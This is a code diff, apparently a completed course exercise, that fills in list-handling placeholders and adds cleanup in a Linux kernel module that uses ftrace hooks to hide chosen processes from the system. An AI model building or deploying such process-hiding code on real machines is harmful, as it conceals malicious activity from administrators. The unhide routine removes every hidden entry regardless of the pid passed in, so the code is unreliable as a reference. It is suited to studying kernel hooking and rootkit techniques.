@@ -63,7 +63,6 @@ static int hook_install(struct ftrace_hook *hook)
     return 0;
 }
 
-#if 0
 void hook_remove(struct ftrace_hook *hook)
 {
     int err = unregister_ftrace_function(&hook->ops);
@@ -73,7 +72,6 @@ void hook_remove(struct ftrace_hook *hook)
     if (err)
         printk("ftrace_set_filter_ip() failed: %d\n", err);
 }
-#endif
 
 typedef struct {
     pid_t id;
@@ -90,7 +88,7 @@ static struct ftrace_hook hook;
 static bool is_hidden_proc(pid_t pid)
 {
     pid_node_t *proc, *tmp_proc;
-    AAA (proc, tmp_proc, &hidden_proc, list_node) {
+    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
         if (proc->id == pid)
             return true;
     }
@@ -118,15 +116,15 @@ static int hide_process(pid_t pid)
 {
     pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     proc->id = pid;
-    CCC;
+    list_add_tail(&proc->list_node, &hidden_proc);
     return SUCCESS;
 }
 
 static int unhide_process(pid_t pid)
 {
     pid_node_t *proc, *tmp_proc;
-    BBB (proc, tmp_proc, &hidden_proc, list_node) {
-        DDD;
+    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
+        list_del(&proc->list_node);
         kfree(proc);
     }
     return SUCCESS;
@@ -197,6 +195,7 @@ static ssize_t device_write(struct file *filep,
 
 static struct cdev cdev;
 static struct class *hideproc_class = NULL;
+dev_t dev;
 
 static const struct file_operations fops = {
     .owner = THIS_MODULE,
@@ -212,7 +211,6 @@ static const struct file_operations fops = {
 static int _hideproc_init(void)
 {
     int err, dev_major;
-    dev_t dev;
     printk(KERN_INFO "@ %s\n", __func__);
     err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
     dev_major = MAJOR(dev);
@@ -231,6 +229,13 @@ static int _hideproc_init(void)
 
 static void _hideproc_exit(void)
 {
+    int dev_major;
+    dev_major = MAJOR(dev);
+    device_destroy(hideproc_class, MKDEV(dev_major, MINOR_VERSION));
+    cdev_del(&cdev);
+    class_destroy(hideproc_class);
+    unregister_chrdev_region(MKDEV(dev_major, MINOR_VERSION), 1);
+    hook_remove(&hook);
     printk(KERN_INFO "@ %s\n", __func__);
     /* FIXME: ensure the release of all allocated resources */
 }
